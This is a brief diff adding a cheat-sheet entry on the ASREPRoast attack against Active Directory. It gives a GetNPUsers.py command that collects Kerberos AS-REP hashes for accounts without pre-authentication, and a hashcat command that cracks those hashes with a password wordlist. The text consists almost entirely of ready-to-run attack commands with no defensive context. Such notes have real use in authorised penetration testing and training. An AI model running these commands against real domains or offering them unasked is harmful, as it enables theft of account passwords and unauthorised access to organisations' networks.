@@ -1,0 +1,5 @@
+The ASREPRoast attack looks for users without Kerberos pre-authentication required.
+python GetNPUsers.py {DOMAIN}/{USER} -format hashcat -usersfile usernames.txt -outputfile hashes.asreproast
+> Hashcat
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
+
